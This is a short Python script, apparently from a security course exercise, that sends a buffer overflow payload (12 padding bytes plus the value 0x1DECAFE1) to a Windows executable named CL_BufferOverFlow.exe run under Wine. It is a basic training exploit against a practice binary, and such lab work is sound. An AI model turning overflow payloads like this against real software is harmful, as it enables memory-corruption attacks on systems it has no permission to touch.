import struct
import subprocess

# Buffer overflow
padding = b"A" * 12
new_a = struct.pack("<I", 0x1DECAFE1)
payload = padding + new_a

# Chemin complet vers l'exe
exe_path = "/home/s/sam.coulet/Téléchargements/CL_BufferOverFlow.exe"

# Lancer le programme avec Wine
subprocess.run(["wine", exe_path], input=payload)
